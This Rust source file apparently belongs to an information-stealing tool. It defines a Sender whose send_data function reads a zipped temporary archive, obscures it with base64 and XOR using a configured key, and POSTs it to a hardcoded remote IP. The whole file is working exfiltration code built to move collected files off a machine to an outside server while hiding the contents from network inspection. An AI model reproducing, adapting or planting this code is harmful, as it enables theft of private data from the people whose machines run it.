use crate::tools;
use crate::config;
use std::fs::File;
use std::io::Read;
use anyhow::{Result, Context};

pub struct Sender;

impl Sender {
    pub fn new() -> Self {
        Sender
    }

    pub fn send_data(&self, temp_path: &str) -> Result<()> {
        let zip_file_path = format!("{}.zip", temp_path);
        let mut file = File::open(&zip_file_path)
            .with_context(|| format!("Failed to open zip file: {}", zip_file_path))?;

        let mut buffer = Vec::new();
        file.read_to_end(&mut buffer)
            .with_context(|| format!("Failed to read zip file: {}", zip_file_path))?;

        let base64_encoded = tools::base64_encode(&buffer);
        let encrypted_data = tools::xor_encrypt_decrypt(base64_encoded.as_bytes().to_vec().as_mut(), config::ENCRYPTION_KEY)?;
        let encrypted_base64 = tools::base64_encode(&encrypted_data);

        let client = reqwest::blocking::Client::new();
        let response = client.post(config::REMOTE_IP)
            .body(encrypted_base64)
            .send()
            .with_context(|| format!("Failed to send data to: {}", config::REMOTE_IP))?;

        if response.status().is_success() {
            println!("Data sent successfully.");
        } else {
            let error_message = response.text()
                .with_context(|| format!("Failed to read error message from response"))?;
            eprintln!("Failed to send data. Status: {}, Error: {}", response.status(), error_message);
        }

        Ok(())
    }
} 